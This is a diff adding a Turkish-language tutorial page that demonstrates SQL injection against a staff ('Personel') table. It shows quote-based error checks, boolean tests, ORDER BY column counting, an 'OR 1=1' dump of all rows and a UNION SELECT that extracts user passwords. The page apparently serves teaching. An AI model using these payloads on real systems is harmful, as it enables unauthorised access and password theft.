@@ -1,0 +1,139 @@
+﻿<div>
+    <br />
+    <h5 style="font-weight:bold;">SOMURME</h5>
+   
+     @{ //Birinci alan
+      }
+    <h6 style="text-decoration: underline;">1.Rastgele kullanıcı çekme</h6>
+    <div class="well">
+        UserId:1013 <br />
+        SQl Sorgusu:SELECT FullName,UserName FROM Personel WHERE UserId = 105
+    </div>
+    TexBox kısmına yukarıdaki gibi sorgu yazarsak kullanıcılar tablosundan ilgili "UserId" ye sahip kişinin FullName(Adı)
+    ve UserName(kullanıcı adı) bilgisini aşağıdaki gibi listeler.
+    <br />  
+    <div class="u" style="text-align:left">
+        <img id="profile-img" class="profile-img-card" src="/img/1013.png" />
+    </div>
+
+    @{ //ikinci alan
+    }
+    <br />
+    <h6 style="text-decoration: underline;">2.Sql İnjeksiyon kontrolu</h6>
+    <div class="well">
+        UserId:0 '<br />
+        SQl Sorgusu:SELECT FullName,UserName FROM Personel WHERE UserId=0 '
+    </div>
+    Sayfada herhangi bir çıktı yok ama aşağıdaki gibi bir hata gözükmektedir.
+    <br />
+    <div class="u" style="text-align:left">
+        <img id="profile-img" class="profile-img-card" src="/img/0'Hata.png" />
+    </div>
+    Yukarıdaki hata UserId parametresinin sql enjeksiyonuna açık olduğunu ve eklediğimiz kodun sorguyu kırdığını gösterir.
+
+    <br />
+    <br />
+    <div class="well">
+        UserId:1013 and 1=1<br />
+        SQl Sorgusu:SELECT FullName,UserName FROM Personel WHERE UserId=1013 and 1=1
+    </div>
+    <br />
+    <div class="u" style="text-align:left">
+        <img id="profile-img" class="profile-img-card" src="/img/1013and1=1.png" />
+    </div>
+     Bilgiler hata göstermeden listelenir.Bunun nedeni eklenen kodun gerçek bir bildirimidir.Eklenen ifade dogru bir şartı 
+    geri getirmezse ne olur?
+    <br />
+    <br />
+    <div class="well">
+        UserId:1013 and 1=2<br />
+        SQl Sorgusu:SELECT FullName,UserName FROM Personel WHERE UserId=1013 and 1=2
+    </div>
+    <br />
+    <div class="u" style="text-align:left">
+        <img id="profile-img" class="profile-img-card" src="/img/1013and1=2.png" />
+    </div>
+    Enjekte edilen kod her zaman yanlış bir deyim içerdiğinden,herhangi bir içerik listelenmez. 
+    Bu, UserId parametresine enjekte edilen kodun gerçekten yürütülmekte olduğunu kanıtlar
+    <br />
+    <br />
+
+    @{ //Üçüncü alan
+    }
+    <h6 style="text-decoration: underline;">3.Mevcut veritabanındaki sütun sayısını bulma</h6>
+
+    <div class="well">
+        UserId:99 or 1=1 order by 1<br />
+        SQl Sorgusu:SELECT FullName,UserName FROM Personel WHERE UserId=99 order by 1
+    </div>
+    Sayfa içeriği herhangi bir sorun olmadan aşağıdaki gibi tüm personeller listelenir ve hiçbir hata iletisi yoktur.
+    <br />
+    <div class="u" style="text-align:left">
+        <img id="profile-img" class="profile-img-card" src="/img/99or1=1orderby1.png" />
+    </div>
+    <br />
+    <br />
+    <div class="well">
+        UserId:99 or 1=1 order by 2<br />
+        SQl Sorgusu:SELECT FullName,UserName FROM Personel WHERE UserId=99 order by 2
+    </div>
+    Sayfa içeriği herhangi bir sorun olmadan aşağıdaki gibi listelenir ve hiçbir hata iletisi yoktur.
+    Dolayısıyla en azından 2 sütün var.
+    <br />
+    <div class="u" style="text-align:left">
+        <img id="profile-img" class="profile-img-card" src="/img/99or1=1orderby2.png" />
+    </div>
+    <br />
+    <br />
+    <div class="well">
+        UserId:99 or 1=1 order by 3<br />
+        SQl Sorgusu:SELECT FullName,UserName FROM Personel WHERE UserId=99 order by 3
+    </div>
+    Bu sefer sayfada aşağıdaki gib bir hata oluşmaktadır.Bu nedenle 3. sütun yoktur.Bu durum sadece 2 sütün olduğunu doğrulamaktadır. 
+    <br />
+    <div class="u" style="text-align:left">
+        <img id="profile-img" class="profile-img-card" src="/img/99or1=1orderby3.png" />
+    </div>
+    @{ //Dördüncü  alan
+    }
+    <br />
+    <br />
+    <h6 style="text-decoration: underline;">4.Tüm Kayıtları Tablodan Çekmek</h6>
+    <div class="well">
+        UserId:105 OR 1=1
+    </div>
+    TexBox kısmına yukarıdaki kodu yazarsam  kullanıcılar tablosundaki tüm kullanıcılara ait FullName ve UserName bilgilerini aşağıdaki gibi listeler
+    
+    <div class="u" style="text-align:left">
+        <img id="profile-img" class="profile-img-card" src="/img/105or1=1.png" />
+    </div>
+    <p>Yukarıdaki Kodun Sql deyimi aşağıdaki gibi gözükücektir</p>
+   <br />
+    <div class="well">
+        SELECT FullName,UserName FROM Personel WHERE UserId = 105 OR 1=1
+    </div>
+    <p>Verileri girdikten sonra yukardaki gibi bir Sql cümlesi oluşur.Sql Yapısındaki "OR 1=1" kısmından  herzaman True döndüğüiçin
+    bütün kullanıcılara ait bilgiler listelenmektedir</p>
+</div>
+    
+    <br />
+    <br />
+    <h6 style="text-decoration: underline;">4.Tabloyo farklı değerler çekme</h6>
+     <br />
+    <div class="well">
+    UserId:99 UNION SELECT FullName,Password FROM Personel<br />
+    SQl Sorgusu:SELECT FullName,UserName FROM Personel WHERE UserId=99 UNION SELECT FullName,Password FROM Personel
+    </div>
+    Tabloda bulunmayan UserId bigisi kullanarak yukaridaki sorgu yapıldığında, tablodaki kullnıcılara ait  FullName ve UserName kısmını listelerken UserName(Kullanıcı adı) kısmına Password bilgisini çekmektedir.
+    <br />
+    <div class="u" style="text-align:left">
+        <img id="profile-img" class="profile-img-card" src="/img/99unionselect.png" />
+    </div>
+    Sistemde bulunan bir UserId ye göre yukarıdaki sorgu yapıldığında UserId sahibinin hem UserName(kullanıcı adını) hemde Password(şifre) bilgisini
+    listelerken diğer tüm kullanıcıları sadece Password bilgisini  aşağıdaki gibi listelemektedir.
+ 
+    <div class="u" style="text-align:left">
+        <img id="profile-img" class="profile-img-card" src="/img/1013unionselect.png" />
+   </div>
+
+  
